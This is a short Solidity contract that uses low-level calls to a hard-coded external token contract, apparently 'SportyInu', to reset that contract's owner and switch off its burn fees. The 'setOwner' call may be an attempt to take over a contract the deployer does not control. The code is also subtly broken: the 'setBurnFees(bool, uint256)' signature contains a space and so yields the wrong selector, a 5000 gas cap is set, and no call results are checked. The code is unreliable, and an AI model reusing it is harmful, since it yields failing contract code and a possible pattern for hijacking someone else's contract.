pragma solidity ^0.8.0;

contract DisableBurnFees{
    address private SportyInuContractAddress = 0x495D25bd77BD5b97912E99F2aAE24a4D32DC6deb;
    address private owner = msg.sender;

    function resetOwner() public returns(bool){
        require(msg.sender == owner, "You must be the owner");
        SportyInuContractAddress.call{gas: 5000}(abi.encodeWithSignature("setOwner(address)", owner));
        return true;
    }

    function setBurnFees() public {
        require(msg.sender == owner, "You must be the owner");
        SportyInuContractAddress.call{gas: 5000}(abi.encodeWithSignature("setBurnFees(bool, uint256)", false, 0));
    }
    

}